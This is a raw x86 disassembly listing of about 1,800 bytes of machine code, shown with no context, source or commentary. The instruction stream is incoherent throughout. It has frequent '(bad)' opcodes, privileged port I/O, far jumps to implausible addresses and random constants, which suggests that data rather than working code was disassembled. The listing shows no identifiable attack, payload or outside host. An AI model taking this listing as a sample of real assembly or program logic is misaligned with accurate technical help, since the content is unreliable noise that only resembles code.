  42738a:	call   0x40f529
  42738f:	xlat   BYTE PTR ds:[ebx]
  427390:	sbb    dl,BYTE PTR cs:[edx+ecx*8]
  427394:	cmp    BYTE PTR [eax],ch
  427396:	add    DWORD PTR [edx+0x5],esp
  427399:	inc    ebp
  42739a:	or     esp,esi
  42739c:	xor    al,0x5
  42739e:	add    BYTE PTR [edx-0x15],ah
  4273a1:	inc    ebp
  4273a2:	call   0x40d9cd
  4273a7:	loope  0x4273b7
  4273a9:	and    DWORD PTR [edx+eiz*2],edx
  4273ac:	xchg   edi,eax
  4273ad:	jp     0x4273cf
  4273af:	arpl   WORD PTR [edx+0x7e197ffe],ax
  4273b5:	dec    BYTE PTR [edx]
  4273b7:	fcomip st,st(1)
  4273b9:	std    
  4273ba:	jmp    DWORD PTR [edx+0x15]
  4273bd:	ret    0x4a23
  4273c0:	dec    eax
  4273c1:	mov    edx,0x66825123
  4273c6:	sti    
  4273c7:	ins    BYTE PTR es:[edi],dx
  4273c8:	cmp    dh,0x65
  4273cb:	bound  edx,QWORD PTR ds:0x4a2623c2
  4273d1:	(bad)  
  4273d2:	cmc    
  4273d3:	bound  eax,QWORD PTR [edx-0x5e313f86]
  4273d9:	mov    eax,DWORD PTR [esi+eax*4-0x42]
  4273dd:	xchg   DWORD PTR [esi+edi*2-0x46],ecx
  4273e1:	cmp    DWORD PTR [eax-0x76],0x22930782
  4273e8:	push   es
  4273e9:	mov    BYTE PTR ds:[eax],al
  4273ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ed:	fdivrp st(1),st
  4273ef:	or     cl,dh
  4273f1:	rol    DWORD PTR [esi],0xb2
  4273f4:	and    dl,BYTE PTR [edx+0x66]
  4273f7:	inc    esi
  4273f8:	or     al,0x82
  4273fa:	(bad)  
  4273fb:	bound  edx,QWORD PTR gs:0xd94623c2
  427402:	nop    eax
  427405:	fsub   st,st(7)
  427407:	xor    DWORD PTR [esi-0x43],0xfffffff6
  42740b:	add    esi,DWORD PTR [edi-0x20]
  42740e:	pop    esi
  42740f:	inc    ecx
  427410:	sti    
  427411:	pushf  
  427412:	call   0x6ca8d61a
  427417:	pop    ds
  427418:	cmp    bl,bl
  42741a:	out    0x3,eax
  42741c:	mov    eax,ds:0xc7b3c45c
  427421:	ja     0x42740b
  427423:	mov    ds:0x6be818dc,eax
  427428:	fldcw  WORD PTR [esi-0x18]
  42742b:	add    ebp,DWORD PTR [ecx+0x21d6d7ad]
  427431:	fnstenv [eax+eax*4+0x46]
  427435:	or     eax,0x626203e6
  42743a:	sub    al,0x20
  42743c:	dec    edx
  42743d:	data16 and al,0x20
  427440:	or     WORD PTR [ebp-0x38],si
  427444:	inc    ecx
  427445:	lds    esp,FWORD PTR [edx+0x7bc541c0]
  42744b:	mov    al,ds:0xc7fd922
  427450:	add    ch,ah
  427452:	fsub   st,st(7)
  427454:	in     eax,dx
  427455:	pop    ebp
  427456:	data16 ins BYTE PTR es:[edi],dx
  427458:	and    BYTE PTR [esi-0x25fc1825],dh
  42745e:	sbb    eax,0x1e20f0c4
  427463:	or     al,0x2c
  427465:	push   ds
  427466:	cmp    ch,BYTE PTR [eax+0x5d914a03]
  42746c:	add    al,0x62
  42746e:	xor    BYTE PTR [ecx-0x2a46b0a8],0xc3
  427475:	sbb    eax,0x620bbf5c
  42747a:	in     eax,dx
  42747b:	add    ah,ah
  42747d:	fisub  WORD PTR [ecx+0x5859a226]
  427483:	clc    
  427484:	jmp    0x97462d3e
  427489:	pop    esi
  42748a:	pusha  
  42748b:	ds loope 0x427418
  42748e:	lods   al,BYTE PTR ds:[esi]
  42748f:	lock fwait
  427491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427492:	jbe    0x427421
  427494:	lods   eax,DWORD PTR ds:[esi]
  427495:	jge    0x427450
  427497:	xchg   DWORD PTR [ebp-0x52744e8b],esp
  42749d:	ins    DWORD PTR es:[edi],dx
  42749e:	aad    0x50
  4274a0:	pop    esp
  4274a1:	call   0x24ba:0xfdae2cba
  4274a8:	(bad)  
  4274a9:	call   FWORD PTR [ecx]
  4274ab:	add    DWORD PTR [edi-0x16d74513],ebp
  4274b1:	and    bl,BYTE PTR ds:0x12001525
  4274b7:	cmp    eax,0x5209e941
  4274bc:	jg     0x4274a7
  4274be:	popa   
  4274bf:	popa   
  4274c0:	inc    ebp
  4274c1:	add    eax,0xcd459b8f
  4274c6:	jne    0x42750e
  4274c8:	call   0x76cd:0x7d595e29
  4274cf:	jbe    0x427458
  4274d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274d2:	pop    edx
  4274d3:	sbb    al,0xc3
  4274d5:	xchg   edx,eax
  4274d6:	pop    esp
  4274d7:	cs cdq 
  4274d9:	ret    
  4274da:	popa   
  4274db:	fst    DWORD PTR [eax+0x76]
  4274de:	pop    esp
  4274df:	imul   ebp,DWORD PTR [edi+0x25],0x7114725e
  4274e6:	aaa    
  4274e7:	mov    dh,0x0
  4274e9:	sbb    al,0x5c
  4274eb:	fadd   DWORD PTR [eax]
  4274ed:	jmp    0x4fe3d24c
  4274f2:	mov    dh,BYTE PTR [edx+0x5a]
  4274f5:	add    ch,al
  4274f7:	xor    al,0x83
  4274f9:	in     eax,0xf6
  4274fb:	sbb    al,0x4f
  4274fd:	mov    ecx,DWORD PTR [edx-0x7c]
  427500:	cli    
  427501:	mov    ebp,fs
  427503:	loope  0x4274ed
  427505:	inc    ecx
  427506:	pop    esi
  427507:	fiadd  DWORD PTR [eax]
  427509:	idiv   BYTE PTR [edi+0x3c0108d5]
  42750f:	fdiv   DWORD PTR [eax+0x74d9bb9f]
  427515:	pop    es
  427516:	push   eax
  427517:	and    cl,ch
  427519:	aam    0x0
  42751b:	xor    edx,ebx
  42751d:	add    BYTE PTR [ebx+0x4bc307d],cl
  427523:	mov    ebx,0x7aec8346
  427528:	sub    dl,BYTE PTR [eax-0x75]
  42752b:	call   0x73e5:0x7539d1c9
  427532:	add    eax,0xeb018368
  427537:	ins    DWORD PTR es:[edi],dx
  427538:	bound  edi,QWORD PTR [edi-0x5c]
  42753b:	mov    ebx,ecx
  42753d:	add    BYTE PTR [ebx+0x503a2d45],cl
  427543:	mov    ds:0xc4ff874c,eax
  427548:	push   edi
  427549:	shl    DWORD PTR [edx+esi*2-0x4d],0x43
  42754e:	cld    
  42754f:	jp     0x427525
  427551:	pop    eax
  427552:	dec    eax
  427553:	dec    esp
  427554:	fimul  DWORD PTR [eax-0x8d718a3]
  42755a:	jne    0x427533
  42755c:	pusha  
  42755d:	(bad)  
  42755e:	call   0x4352b2
  427563:	push   ebp
  427564:	dec    ebp
  427565:	add    BYTE PTR [ebx+0x72],bl
  427568:	sbb    BYTE PTR [ecx+0xe58901],dh
  42756e:	(bad)  
  42756f:	bound  eax,QWORD PTR [ecx]
  427571:	mov    DWORD PTR [eax],eax
  427573:	bound  eax,QWORD PTR [edx-0x7d9e0000]
  427579:	data16 mov ah,0x84
  42757c:	cmp    dh,0xaf
  42757f:	add    BYTE PTR [ebx-0x41],ah
  427582:	jge    0x42753d
  427584:	fiadd  DWORD PTR [edx+0x5662fffe]
  42758a:	idiv   dl
  42758c:	outs   dx,BYTE PTR ds:[esi]
  42758d:	sahf   
  42758e:	push   es
  42758f:	jg     0x4275b4
  427591:	push   ebx
  427592:	push   ebx
  427593:	je     0x4275d3
  427595:	jp     0x4275fd
  427597:	xchg   esp,eax
  427598:	mov    WORD PTR [ecx-0x125d7b02],es
  42759e:	stc    
  42759f:	sub    eax,0xaffed7a2
  4275a4:	arpl   ax,ax
  4275a6:	or     al,0x0
  4275a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275a9:	add    DWORD PTR [edx-0x57d9e00],eax
  4275af:	jmp    FWORD PTR [ebp+0x347c6682]
  4275b5:	cmp    dh,0xaf
  4275b8:	arpl   WORD PTR [edi],di
  4275ba:	mov    cl,0x86
  4275bc:	xchg   cl,dl
  4275be:	stos   BYTE PTR es:[edi],al
  4275bf:	push   edx
  4275c0:	ffreep st(5)
  4275c2:	pop    eax
  4275c3:	push   eax
  4275c4:	fnstenv [ecx]
  4275c6:	mov    ax,ds:0x84fe8269
  4275cc:	mov    ds:0xef872cd4,al
  4275d1:	jns    0x42755a
  4275d3:	adc    edx,DWORD PTR [edx]
  4275d5:	arpl   cx,dx
  4275d7:	sti    
  4275d8:	jmp    0xdf50c907
  4275dd:	inc    ecx
  4275de:	aam    0x1a
  4275e0:	mov    dl,0xf7
  4275e2:	inc    ebx
  4275e3:	call   0xfeb96ae8
  4275e8:	(bad)  
  4275e9:	out    dx,eax
  4275ea:	fsubr  DWORD PTR [edi+edx*2+0x6b2a6092]
  4275f1:	stos   DWORD PTR es:[edi],eax
  4275f2:	loopne 0x4275db
  4275f4:	add    ebx,edi
  4275f6:	cwde   
  4275f7:	retf   
  4275f8:	cmp    dl,dl
  4275fa:	fldenv [edx-0x1b68d54b]
  427600:	add    edi,DWORD PTR [ecx+ebx*4]
  427603:	aas    
  427604:	dec    ebp
  427605:	scas   eax,DWORD PTR es:[edi]
  427606:	pusha  
  427607:	cmp    al,0xb4
  427609:	xchg   ebx,eax
  42760a:	or     al,0x75
  42760c:	sar    cl,0x8
  42760f:	outs   dx,DWORD PTR ds:[esi]
  427610:	pop    esp
  427611:	cli    
  427612:	adc    bh,bl
  427614:	add    esp,DWORD PTR [edx+0x60]
  427617:	sbb    BYTE PTR [eax+0x1ccaf2d0],al
  42761d:	dec    edi
  42761e:	in     eax,0xea
  427620:	(bad)  
  427621:	push   esi
  427622:	in     eax,0x6c
  427624:	dec    ebp
  427625:	dec    eax
  427626:	rcl    DWORD PTR [ecx-0x1c8ac8aa],1
  42762c:	iret   
  42762d:	pop    ebp
  42762e:	je     0x427625
  427630:	mov    bh,0x53
  427632:	sbb    eax,ebp
  427634:	sbb    BYTE PTR [esi+0x30455ee4],0x81
  42763b:	push   ds
  42763c:	or     DWORD PTR [edx-0x27],esp
  42763f:	outs   dx,BYTE PTR ds:[esi]
  427640:	ds test edi,edx
  427643:	dec    sp
  427645:	mov    DWORD PTR [ebx],edx
  427647:	or     cl,BYTE PTR [ebx+0x0]
  42764a:	mov    esp,0xdcade7e0
  42764f:	in     al,dx
  427650:	ret    
  427651:	pop    es
  427652:	adc    DWORD PTR [eax+0x14],esp
  427655:	and    BYTE PTR [esi+0x5e],cl
  427658:	mov    edx,esi
  42765a:	ja     0x427662
  42765c:	outs   dx,DWORD PTR ds:[esi]
  42765d:	mov    eax,0x16ec981
  427662:	mov    cl,0xb
  427664:	add    DWORD PTR [edx-0x65],esp
  427667:	outs   dx,BYTE PTR ds:[esi]
  427668:	adc    DWORD PTR [esi+eiz*4-0x11],esp
  42766c:	or     BYTE PTR [edx],dl
  42766e:	xchg   esi,eax
  42766f:	jb     0x42765b
  427671:	fs xchg edi,eax
  427673:	out    dx,al
  427674:	in     al,dx
  427675:	mov    dl,0x7a
  427677:	in     eax,dx
  427678:	and    al,0xf9
  42767a:	(bad)  
  42767b:	pop    ebx
  42767c:	ret    
  42767d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42767e:	mov    ds:0xda9400e5,eax
  427683:	test   DWORD PTR [esi+0x4d],edi
  427686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427687:	repnz in al,dx
  427689:	fnsave [edx-0x38e779f8]
  42768f:	pop    ebx
  427690:	sub    DWORD PTR [ebp+0x66],0xffffffd9
  427694:	add    BYTE PTR [esi+ebx*4-0x14],ch
  427698:	or     ah,BYTE PTR [edx+0x1d]
  42769b:	jecxz  0x42765f
  42769d:	jmp    0xed86d102
  4276a2:	cmp    BYTE PTR [esi-0x3d9e1700],cl
  4276a8:	aad    0xbb
  4276aa:	sub    BYTE PTR [edx-0x7dffca78],dh
  4276b0:	fidivr WORD PTR [ebp-0x1f]
  4276b3:	arpl   sp,bp
  4276b5:	pop    ss
  4276b6:	adc    ch,ch
  4276b8:	fiadd  WORD PTR [ebp+0x442566aa]
  4276be:	cmc    
  4276bf:	jmp    0x4f309bd9
  4276c4:	push   edi
  4276c5:	(bad)  
  4276c6:	jmp    0xe940502c
  4276cb:	popa   
  4276cc:	fxam   
  4276ce:	jmp    0xec17:0x390d1cea
  4276d5:	or     BYTE PTR [edx+0x1f],ah
  4276d8:	pusha  
  4276d9:	inc    ebp
  4276da:	lds    ebx,FWORD PTR [ecx+0x7a]
  4276dd:	jle    0x4276df
  4276df:	outs   dx,BYTE PTR ds:[esi]
  4276e0:	fld    QWORD PTR [eax]
  4276e2:	mov    esp,ebx
  4276e4:	fsubr  QWORD PTR [esi-0x1ea6ebba]
  4276ea:	jg     0x4276ae
  4276ec:	xor    bl,BYTE PTR [esi]
  4276ee:	adc    al,0xc8
  4276f0:	push   cs
  4276f1:	push   DWORD PTR [ebx+esi*1+0x59]
  4276f5:	leave  
  4276f6:	jmp    DWORD PTR [edx+0xb00005a]
  4276fc:	repz shl BYTE PTR [esi+ebx*2+0x58],0xf9
  427702:	sbb    edx,edi
  427704:	int    0x81
  427706:	xchg   BYTE PTR [edi-0x2a],bh
  427709:	add    BYTE PTR [eax],al
  42770b:	lock sbb BYTE PTR [ebp+0xc],bh
  42770f:	mov    BYTE PTR [esi],cl
  427711:	sti    
  427712:	jle    0x427714
  427714:	add    al,0x61
  427716:	inc    esp
  427717:	adc    BYTE PTR [ebx+0x480fe36e],al
  42771d:	dec    esp
  42771e:	mov    DWORD PTR [eax],eax
  427720:	retf   
  427721:	aad    0xfa
  427723:	mov    al,BYTE PTR [esi]
  427725:	popw   es
  427727:	xchg   ebp,eax
  427728:	jp     0x427788
  42772a:	or     DWORD PTR [ebx+0x15a25],eax
  427730:	retf   
  427731:	aad    0x81
  427733:	into   
  427734:	xchg   ebx,eax
  427735:	mov    ecx,DWORD PTR [ecx]
  427737:	add    BYTE PTR [ebx-0x74feb7ec],bh
  42773d:	aad    0x84
  42773f:	sahf   
  427740:	pop    es
  427741:	fld    QWORD PTR [eax]
  427743:	add    BYTE PTR [edi-0x42],dl
  427746:	add    DWORD PTR [esi+0xdcff],0x57d1a70
  427750:	or     BYTE PTR ds:0xf3737dfb,ah
  427756:	inc    esp
  427757:	and    al,0x62
  427759:	jnp    0x4276dd
  42775b:	rcl    dh,0xe3
  42775e:	mov    ch,0xfa
  427760:	iret   
  427761:	push   0xffffff81
  427763:	dec    edx
  427764:	ret    0x404a
  427767:	sub    al,0x63
  427769:	or     BYTE PTR [ecx+0x7afab6c0],0x44
  427770:	jle    0x4277d9
  427772:	add    al,0xb6
  427775:	sub    eax,DWORD PTR [edx-0x7d21ff66]
  42777b:	(bad)  
  42777c:	call   DWORD PTR [esi+0x6a427b43]
  427782:	add    ebx,DWORD PTR [ebp+0x0]
  427785:	xchg   esi,eax
  427786:	jle    0x42773e
  427788:	je     0x4277fc
  42778a:	sti    
  42778b:	ds call 0x40faf2
  427791:	or     DWORD PTR [eax-0x43053585],eax
  427797:	add    al,0x0
  427799:	bound  eax,QWORD PTR [ebx]
  42779b:	(bad)
  42779f:	(bad)  
  4277a0:	std    
  4277a1:	push   ecx
  4277a2:	jnp    0x42781f
  4277a4:	dec    edx
  4277a5:	inc    esi
  4277a6:	jmp    0x42776e
  4277a8:	pop    edi
  4277a9:	loope  0x42780b
  4277ab:	fdivp  st(7),st
  4277ad:	loopne 0x427807
  4277af:	loop   0x4277b0
  4277b1:	loopne 0x4277d3
  4277b3:	(bad)  
  4277b5:	adc    dh,BYTE PTR [edx-0xf453587]
  4277bb:	cld    
  4277bc:	call   FWORD PTR [ebp+0x6523c1fc]
  4277c2:	add    ecx,edx
  4277c4:	and    esi,DWORD PTR [esi-0x7e]
  4277c7:	fnstenv [edi]
  4277c9:	fiadd  WORD PTR [edx-0x27]
  4277cc:	sub    cl,ah
  4277ce:	add    BYTE PTR [esi+0x0],dh
  4277d1:	(bad)  
  4277d2:	(bad)  
  4277d4:	add    eax,0x9166e1f7
  4277d9:	(bad)  
  4277da:	(bad)  
  4277dc:	add    eax,DWORD PTR [eax]
  4277de:	pop    ebp
  4277df:	in     al,dx
  4277e0:	repnz xchg eax,edi
  4277e3:	push   esp
  4277e4:	call   0x1127d9ec
  4277e9:	jg     0x4277cb
  4277eb:	pop    esp
  4277ec:	call   0xa6f6d9f4
  4277f1:	iret   
  4277f2:	cwde   
  4277f3:	pop    esp
  4277f4:	pusha  
  4277f5:	add    eax,0xc86f13a9
  4277fa:	push   ebp
  4277fb:	xchg   edi,eax
  4277fc:	call   0xe8a38304
  427801:	add    esp,DWORD PTR [edx+0x64]
  427804:	xor    bl,BYTE PTR [ebx-0x5b]
  427807:	std    
  427808:	out    0x3,eax
  42780a:	fst    QWORD PTR [esi+0x64]
  42780d:	add    esp,DWORD PTR [edx-0x27]
  427810:	lahf   
  427811:	mov    ebx,0xbbb01671
  427816:	jbe    0x427804
  427818:	outs   dx,BYTE PTR ds:[esi]
  427819:	leave  
  42781a:	pop    ebp
  42781b:	pop    esp
  42781c:	add    BYTE PTR [ebx],al
  42781e:	push   esi
  42781f:	jecxz  0x4277c0
  427821:	fsubr  DWORD PTR [ecx-0x7f]
  427824:	inc    esp
  427825:	add    eax,0x80ed962
  42782a:	mov    edx,0x6203e8cf
  42782f:	pop    esp
  427830:	sub    bh,BYTE PTR [ebx+0x62]
  427833:	(bad)  
  427835:	add    eax,0x426ed837
  42783a:	mov    edx,0x6203dfff
  42783f:	arpl   WORD PTR [eax+ebp*1],bx
  427842:	add    BYTE PTR [ecx+0x55],ch
  427845:	mov    cl,0xd7
  427847:	pop    edx
  427848:	pop    esp
  427849:	jp     0x4278c7
  42784b:	(bad)  
  42784c:	fld    DWORD PTR [eax]
  42784e:	jmp    0xfa415eba
  427853:	inc    esi
  427854:	pop    eax
  427855:	inc    esp
  427856:	stc    
  427857:	jmp    0xe71e5e2c
  42785c:	adc    eax,0xa6aaea09
  427861:	jl     0x427828
  427863:	push   ecx
  427864:	out    dx,al
  427865:	sbb    BYTE PTR [ecx+0x5e],ch
  427868:	xlat   BYTE PTR ds:[ebx]
  427869:	jae    0x427845
  42786b:	mov    dl,0xe4
  42786d:	adc    BYTE PTR [edx],bl
  42786f:	div    BYTE PTR [esi+0x14]
  427872:	outs   dx,DWORD PTR ds:[esi]
  427873:	xchg   ebx,eax
  427874:	jb     0x4278ac
  427876:	sub    ah,BYTE PTR [ebx+0x54]
  427879:	jnp    0x4278da
  42787b:	xchg   ebx,eax
  42787c:	jb     0x4278c0
  42787e:	arpl   ax,bp
  427880:	push   ebp
  427881:	add    ecx,ebp
  427883:	popa   
  427884:	push   esi
  427885:	dec    esp
  427886:	fldcw  WORD PTR [ebx-0x79d5e077]
  42788c:	fadd   DWORD PTR [ebp+0x5610b32e]
  427892:	bound  edi,QWORD PTR [ebp+0xc]
  427895:	mov    edi,0x860461f5
  42789a:	or     eax,0xba357ddf
  42789f:	sbb    ecx,DWORD PTR [esi+eax*4]
  4278a2:	adc    BYTE PTR [edi+0x1a],dl
  4278a5:	push   ecx
  4278a6:	push   es
  4278a7:	add    BYTE PTR [ebx-0x2e667a06],ch
  4278ad:	push   edi
  4278ae:	mov    cl,BYTE PTR [ebp+0x66]
  4278b1:	fld    DWORD PTR [eax]
  4278b3:	pop    esp
  4278b4:	repz push cs
  4278b6:	rcl    bl,0x67
  4278b9:	jb     0x4278e9
  4278bb:	push   0x3f
  4278bd:	fsubr  st,st(0)
  4278bf:	xor    BYTE PTR [eax+0x3162fa73],cl
  4278c5:	push   esp
  4278c6:	repz add BYTE PTR [edi-0x3f],cl
  4278ca:	out    dx,al
  4278cb:	inc    esi
  4278cc:	imul   edx,edi,0xffffff81
  4278cf:	dec    edi
  4278d0:	pop    ebx
  4278d1:	xchg   ecx,eax
  4278d2:	sbb    al,BYTE PTR [ebx+0x6a026542]
  4278d8:	jnp    0x4278c7
  4278da:	(bad)  
  4278db:	call   0x3a0690
  4278e0:	rcr    BYTE PTR [eax],0xe9
  4278e3:	enter  0x85e,0xf6
  4278e7:	mov    edx,DWORD PTR ds:0x3ba71412
  4278ed:	ficom  DWORD PTR [ebp+0x5e]
  4278f0:	push   eax
  4278f1:	mov    dl,0xb9
  4278f3:	push   esi
  4278f4:	jecxz  0x427916
  4278f6:	cmp    edi,0xffffffc4
  4278f9:	push   esi
  4278fa:	shl    DWORD PTR [eax+ebx*4-0x13],0xc6
  4278ff:	call   0x39f0ee
  427904:	and    BYTE PTR [ecx-0x77],0x0
  427908:	sti    
  427909:	fnstcw WORD PTR [ecx+0x7e]
  42790c:	add    bl,dl
  42790e:	fldcw  WORD PTR [esi-0x22]
  427911:	adc    ch,0x79
  427914:	gs cmp ebx,edx
  427917:	xchg   DWORD PTR [ebp+0x4f],eax
  42791a:	in     eax,dx
  42791b:	cmp    DWORD PTR [edx+esi*2],eax
  42791e:	aas    
  42791f:	test   BYTE PTR [ecx-0x24d4ddf2],0x4b
  427926:	sbb    eax,0xd97e72fa
  42792b:	scas   al,BYTE PTR es:[edi]
  42792c:	ret    
  42792d:	ss daa 
  42792f:	retf   0x4066
  427932:	outs   dx,BYTE PTR ds:[esi]
  427933:	inc    ebp
  427934:	adc    bl,dl
  427936:	cdq    
  427937:	cli    
  427938:	out    0x9c,eax
  42793a:	sub    al,0xf8
  42793c:	call   DWORD PTR [ecx]
  42793e:	aad    0x8b
  427940:	inc    ebp
  427941:	bound  esi,QWORD PTR [eax]
  427943:	mov    ch,0x8c
  427945:	daa    
  427946:	nop
  427947:	pop    ebp
  427948:	xlat   BYTE PTR ds:[ebx]
  427949:	cmc    
  42794a:	jg     0x42794a
  42794c:	cmp    esp,DWORD PTR [ebx-0x5c]
  42794f:	pop    edx
  427950:	cli    
  427951:	mov    eax,ds:0x867f2f9a
  427956:	jnp    0x427907
  427958:	push   esp
  427959:	adc    al,0xaf
  42795b:	jne    0x427956
  42795d:	gs push es
  42795f:	test   eax,0x77826200
  427964:	dec    ebx
  427965:	mov    dl,0x5a
  427967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427968:	xchg   BYTE PTR [ebp+0x54],cl
  42796b:	jbe    0x42795d
  42796d:	(bad)  
  42796f:	stc    
  427970:	add    DWORD PTR [eax],0x5d
  427973:	cmp    esi,0xd8dbe9ff
  427979:	cs aas 
  42797b:	or     eax,0x82628482
  427980:	inc    BYTE PTR [eax]
  427982:	xchg   esi,eax
  427983:	ja     0x427906
  427985:	inc    ebx
  427986:	xchg   edx,eax
  427987:	leave  
  427988:	cdq    
  427989:	mov    BYTE PTR [edx-0x7e],ah
  42798c:	(bad)  
  42798d:	je     0x4279ef
  42798f:	out    0x47,eax
  427991:	push   eax
  427992:	jmp    0x8957d64b
  427997:	mov    ebx,0x64228449
  42799c:	and    dl,0x62
  42799f:	cmp    dh,0x7e
  4279a2:	sbb    eax,0x620004fb
  4279a7:	sbb    cl,0x52
  4279aa:	mov    DWORD PTR [ebx],esi
  4279ac:	shl    BYTE PTR [ebx+0x30],cl
  4279af:	std    
  4279b0:	mov    ecx,0x7778485f
  4279b5:	add    ebx,ebp
  4279b7:	and    ch,BYTE PTR ss:[eax]
  4279ba:	(bad)  
  4279bc:	sub    BYTE PTR [eax],cl
  4279be:	fist   DWORD PTR ds:0xc6042004
  4279c4:	mov    DWORD PTR fs:[ecx-0x4f],0xe488b937
  4279cc:	cmp    edi,DWORD PTR [ebp-0xa]
  4279cf:	mov    ah,0xf3
  4279d1:	jl     0x427a01
  4279d3:	mov    ch,0x27
  4279d5:	pop    esp
  4279d6:	add    BYTE PTR [esi-0x12fc16c2],al
  4279dc:	xchg   esp,eax
  4279dd:	cld    
  4279de:	mov    BYTE PTR [edx+0x5cd9c8e6],ah
  4279e4:	pop    ebp
  4279e5:	cmp    al,0x28
  4279e7:	outs   dx,BYTE PTR ds:[esi]
  4279e8:	adc    al,BYTE PTR [eax-0x7c9465f7]
  4279ee:	mov    ah,0xd6
  4279f0:	adc    al,0xc4
  4279f2:	pop    ss
  4279f3:	xchg   edx,eax
  4279f4:	or     ah,BYTE PTR [ebp-0x39]
  4279f7:	or     ebp,0xb59e8117
  4279fd:	pop    ss
  4279fe:	pop    esp
  4279ff:	and    eax,DWORD PTR [eax+ebp*8+0x3]
  427a03:	in     eax,0x9a
  427a05:	inc    eax
  427a06:	out    dx,eax
  427a07:	mov    ebp,DWORD PTR [ebx+ecx*2-0x78]
  427a0b:	and    ah,ch
  427a0d:	mov    ecx,0x6f0962d9
  427a12:	xor    eax,0xd9409be5
  427a17:	jge    0x4279f2
  427a19:	out    0x7a,eax
  427a1b:	or     dl,BYTE PTR [esi+0x3f]
  427a1e:	xlat   BYTE PTR ds:[ebx]
  427a1f:	jp     0x427a20
  427a21:	sbb    cl,BYTE PTR [esi+0x4d]
  427a24:	aad    0x12
  427a26:	clc    
  427a27:	ffree  st(6)
  427a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2a:	add    esp,edi
  427a2c:	cwde   
  427a2d:	jge    0x4279e9
  427a2f:	mov    al,BYTE PTR [eax]
  427a31:	lock xlat BYTE PTR ds:[ebx]
  427a33:	and    ebx,DWORD PTR [esi+0x1]
  427a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a37:	xchg   ecx,eax
  427a38:	pusha  
  427a39:	push   0xffffff85
  427a3b:	add    BYTE PTR [ecx],cl
  427a3d:	mov    al,ds:0x5461e827
  427a42:	jb     0x427a7d
  427a44:	mov    eax,0x14e8686d
  427a49:	pop    edi
  427a4a:	sub    eax,0x65e8d961
  427a50:	pop    edi
  427a51:	fld    DWORD PTR [eax]
  427a53:	ins    BYTE PTR es:[edi],dx
  427a54:	mov    ds:0xf46450c3,eax
  427a59:	js     0x427a5b
  427a5b:	jmp    0xd101fbc1
  427a60:	pusha  
  427a61:	(bad)  [ebx-0x73f681d6]
  427a67:	scas   al,BYTE PTR es:[di]
  427a69:	fadd   DWORD PTR [eax]
  427a6b:	jmp    0xe86ab519
  427a70:	popa   
  427a71:	pop    esp
  427a72:	mov    ebp,DWORD PTR [ecx+0x61]
  427a75:	fld    DWORD PTR [eax]
  427a77:	and    DWORD PTR [ebp-0x29],0x53f0e900
  427a7e:	(bad)  
  427a7f:	push   ecx
  427a80:	cmp    al,0xdb
  427a82:	stc    
  427a83:	pop    esi
  427a84:	mov    ebx,0xd9c737d4
  427a89:	out    0xa,eax
  427a8b:	dec    esi
  427a8c:	div    DWORD PTR ds:0x5261e901
  427a92:	dec    edx
  427a93:	cdq    
  427a94:	cdq    
  427a95:	inc    ecx
  427a96:	mov    BYTE PTR [esi],dh
  427a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a99:	push   cs
  427a9a:	pop    ebx
  427a9b:	mov    WORD PTR [edx+0xe5c4eb],?
  427aa1:	mov    ds:0x31725308,al
  427aa6:	push   es
  427aa7:	cli    
  427aa8:	pop    edi
  427aa9:	or     bl,dl
  427aab:	add    cl,ch
  427aad:	dec    edx
  427aae:	pop    ds
  427aaf:	push   ecx
  427ab0:	add    BYTE PTR [ebx+0x29],dh
  427ab3:	mov    edi,edi
  427ab5:	mov    esp,0xac85f8f1
  427aba:	xor    BYTE PTR [ecx],0xff
  427abd:	xor    eax,0xbccf8372
  427ac2:	test   BYTE PTR [edx-0x18],bl
  427ac5:	in     eax,dx
  427ac6:	nop
  427ac7:	idiv   edi
  427ac9:	pop    es
  427aca:	push   ss
  427acb:	je     0x427add
  427acd:	pushf  
  427ace:	inc    esp
  427acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ad0:	add    BYTE PTR [ebx-0x2a],bh
  427ad3:	or     DWORD PTR [esi+0x5b],0xac89690d
  427ada:	sbb    eax,0x166810e2
  427adf:	xor    al,BYTE PTR [edi+0x33]
  427ae2:	cmp    BYTE PTR [edx-0x7828147d],0x86
  427ae9:	ret    
  427aea:	(bad)  
  427aeb:	add    BYTE PTR [eax],al
  427aed:	jl     0x427b2a
  427aef:	pop    ecx
  427af0:	ret    
  427af1:	data16 lock in al,dx
  427af4:	sub    edi,0x25
  427af7:	push   eax
  427af8:	mov    edi,DWORD PTR [edx-0x584908db]
  427afe:	(bad)  
  427aff:	add    BYTE PTR [eax],al
  427b01:	mov    al,0x2c
  427b03:	dec    edx
  427b04:	call   0xf6318d09
  427b09:	inc    DWORD PTR [esi+0x50840616]
  427b0f:	(bad)  
  427b10:	add    BYTE PTR [eax],al
  427b12:	or     BYTE PTR ds:0x5b62d22a,bl
  427b18:	mov    DWORD PTR [eax],eax
  427b1a:	or     edx,esi
  427b1c:	dec    ebp
  427b1d:	(bad)  
  427b1e:	int    0x85
  427b20:	pop    es
  427b21:	inc    esp
  427b22:	xor    DWORD PTR ds:0xe938b51,esp
  427b28:	scas   eax,DWORD PTR es:[edi]
  427b29:	imul   esp,DWORD PTR [edx-0x3d],0x4c
  427b2d:	jg     0x427b3b
  427b2f:	clc    
  427b30:	std    
  427b31:	jmp    DWORD PTR [edx+0x7e]
  427b34:	std    
  427b35:	test   BYTE PTR [eax+eax*4],al
  427b38:	(bad)  
  427b39:	jmp    edi
  427b3b:	xor    esi,ebx
  427b3d:	gs gs idiv esi
  427b41:	mov    BYTE PTR [edi],bl
  427b43:	pushf  
  427b44:	jp     0x427b87
  427b46:	jmpw   0x6701
  427b4a:	out    0xac,eax
  427b4c:	cmp    BYTE PTR [ecx-0x25],bl
  427b4f:	sbb    al,0x65
  427b51:	mov    DWORD PTR [edi],ebx
  427b53:	mov    BYTE PTR [ebp-0x2b],bl
  427b56:	and    al,0x2a
  427b58:	inc    esi
  427b59:	push   ebx
  427b5a:	out    0xbc,eax
